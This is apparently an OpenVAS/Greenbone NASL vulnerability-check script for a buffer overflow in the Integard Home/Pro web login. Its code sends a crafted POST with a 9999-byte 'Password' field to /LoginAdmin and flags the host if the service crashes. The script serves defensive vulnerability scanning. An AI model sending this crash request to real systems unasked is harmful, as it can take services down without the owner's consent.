# SPDX-FileCopyrightText: 2010 Greenbone AG
# Some text descriptions might be excerpted from (a) referenced
# source(s), and are Copyright (C) by the respective right holder(s).
#
# SPDX-License-Identifier: GPL-2.0-only

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.901155");
  script_version("2025-03-05T05:38:52+0000");
  script_tag(name:"last_modification", value:"2025-03-05 05:38:52 +0000 (Wed, 05 Mar 2025)");
  script_tag(name:"creation_date", value:"2010-09-23 08:13:58 +0200 (Thu, 23 Sep 2010)");
  script_tag(name:"cvss_base", value:"6.8");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:M/Au:N/C:P/I:P/A:P");
  script_name("Integard Home and Pro HTTP Buffer Overflow Vulnerability");

  script_xref(name:"URL", value:"http://secunia.com/advisories/41312");
  script_xref(name:"URL", value:"http://www.exploit-db.com/exploits/14941/");
  script_xref(name:"URL", value:"http://www.corelan.be:8800/index.php/forum/security-advisories/corelan-10-061-integard-home-and-pro-v2-remote-http-buffer-overflow-exploit/");

  script_category(ACT_DENIAL);
  script_copyright("Copyright (C) 2010 Greenbone AG");
  script_family("Buffer overflow");
  script_dependencies("find_service.nasl", "httpver.nasl", "global_settings.nasl");
  script_require_ports("Services/www", 18881);
  script_exclude_keys("Settings/disable_cgi_scanning");

  script_tag(name:"impact", value:"Successful exploitation may allow remote attackers to execute arbitrary code
  on the system with elevated privileges or cause the application to crash.");

  script_tag(name:"affected", value:"Integard Home version prior to 2.0.0.9037

  Integard Pro version prior to 2.2.0.9037");

  script_tag(name:"insight", value:"The flaw is due to a boundary error within the web interface when
  processing certain HTTP requests. This can be exploited to cause a stack-based
  buffer overflow by sending specially crafted HTTP POST requests containing an
  overly long 'Password' parameter to the web interface.");

  script_tag(name:"solution", value:"Upgrade to Integard Pro version 2.2.0.9037 or Integard Home version 2.0.0.9037.");

  script_tag(name:"summary", value:"Integard Home/Pro internet content filter HTTP server is prone to a buffer overflow vulnerability.");

  script_tag(name:"solution_type", value:"VendorFix");
  script_tag(name:"qod_type", value:"remote_analysis");

  exit(0);
}

include("http_func.inc");
include("http_keepalive.inc");
include("port_service_func.inc");

port = http_get_port(default:18881);

res = http_get_cache(item:"/", port:port);

if('<title>Integard Login</title>' >< res)
{
  crash = "Password=" + crap(9999) + "&Redirect=%23%23%23REDIRECT%23%23%23&" +
          "NoJs=0&LoginButtonName=Login" ;

  req = http_post(port:port, item:"/LoginAdmin", data:crash);
  res = http_keepalive_send_recv(port:port, data:req, bodyonly:TRUE);

  if (http_is_dead(port: port))
  {
    security_message(port:port);
    exit(0);
  }
}

exit(99);
